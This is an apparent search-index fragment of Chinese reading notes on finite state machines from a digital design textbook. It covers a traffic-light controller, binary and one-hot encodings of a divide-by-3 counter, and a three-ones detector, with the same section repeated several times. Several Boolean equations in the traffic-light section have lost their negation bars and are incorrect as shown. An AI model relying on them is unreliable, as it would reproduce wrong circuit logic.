输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#设计示例13进制计数器"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#背景分析"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#状态转换图绘制"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#采用二进制编码设计"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 